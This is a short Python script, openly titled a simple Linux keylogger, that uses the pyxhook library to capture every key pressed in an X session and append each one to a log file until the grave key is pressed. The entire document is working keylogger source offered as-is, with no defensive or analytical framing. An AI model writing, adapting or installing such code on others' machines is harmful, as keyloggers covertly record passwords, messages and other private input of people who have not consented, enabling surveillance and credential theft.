
#################################
#  Simple Linux Keylogger       #
#  Created by John Lavery       #
#  Year of 2017                 #
#  Written in Python 3.8        #
#################################

# import modules
import pyxhook

# specify where log will write to
log_file='<insert path to where .log file will right>'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  try:
      with open(log_file,'a') as fob:
          fob.write(event.Key)
          fob.write('\n')

      if event.Ascii==96: #96 is the ascii value of the grave key (`)
        new_hook.cancel()
  except IOError:
        print("An error occurred while trying to write to the log file.")
  finally:
        fob.close()
    
#instantiate HookManager class
new_hook=pyxhook.HookManager()

#listen to all keystrokes
new_hook.KeyDown=OnKeyPress

#hook the keyboard
new_hook.HookKeyboard()

#start the session
new_hook.start()
